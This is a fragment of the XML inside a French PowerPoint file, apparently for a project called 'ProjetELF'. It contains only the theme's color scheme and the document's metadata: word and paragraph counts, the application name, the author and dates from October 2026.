      </a:lt1>
      <a:dk2>
        <a:srgbClr val="1A2340"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="E8EDF5"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="00D4FF"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="FF4060"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="00FF9F"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="FFB800"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="7B2FFF"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="4A90E2"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="00D4FF"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="7B2FFF"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="ProjetELF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2328</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>Affichage à l'écran (16:9)</PresentationFormat>
  <Paragraphs>345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ProjetELF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Christ Erwan BROU</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-10-13T21:02:06Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-13T21:32:40Z</dcterms:modified>
</cp:coreProperties>
</file>